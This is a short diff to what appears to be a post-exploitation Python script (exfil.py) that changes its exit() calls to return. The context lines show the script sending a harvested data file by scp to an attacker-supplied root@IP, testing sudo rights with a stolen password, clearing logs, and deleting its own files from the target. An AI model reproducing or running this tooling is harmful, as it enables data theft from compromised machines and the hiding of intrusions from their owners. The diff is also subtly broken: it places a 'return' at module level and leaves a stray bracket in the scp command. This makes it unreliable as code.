@@ -25,7 +25,7 @@ def extract_clear(local_path):
     answer = input("(yes/no): ")
 
     if answer == "no":
-        exit()
+        return
     elif answer == "yes":
         # get local machine ip
         local_path = input("local IP and file save path (10.0.0.1/home/file.txt): ")
@@ -89,7 +89,7 @@ def extract_clear(local_path):
         # exfil the data file to local machine
         os.system(f"scp /tmp/data_exfil.txt root@{local_path}]")
         print(f"\n*** data_exfil.txt sent to {local_path} ***")
-        exit()
+        return
     else:
         print("didn't write yes or no!!!")
         extract_clear()
@@ -100,16 +100,16 @@ if args.password:
     def cred_info(password):
         cred = input("do you know user's passwd? (yes/no): ")
         if cred == "no":
-            exit()
+            return
         elif cred == "yes":
             passwd = input("passwd: ")
             print("\n### running sudo -l: ###")
             os.system(f"timeout -k 3 3 sudo -l -S {password}")
-            exit()
+            return
         else:
             cred_info()
 else:
-    exit()
+    return
 
 
 # ask to clear logs and delete script from local machine
@@ -118,7 +118,7 @@ def delete_file():
     answer_2 = input("(yes/no): ")
     if answer_2 == "no":
         print("good luck!")
-        exit()
+        return
     elif answer_2 == "yes":
         # delete logs and this script from target machine
         print("\n### clearing log files ###")
@@ -134,7 +134,7 @@ def delete_file():
         print("\n### deleting data file and script... ###")
         os.system("rm -rf /tmp/.data")
         os.system("rm -f exfil.py")
-        exit()
+        return
     else:
         print("didn't write yes or no!!!")
         delete_file()
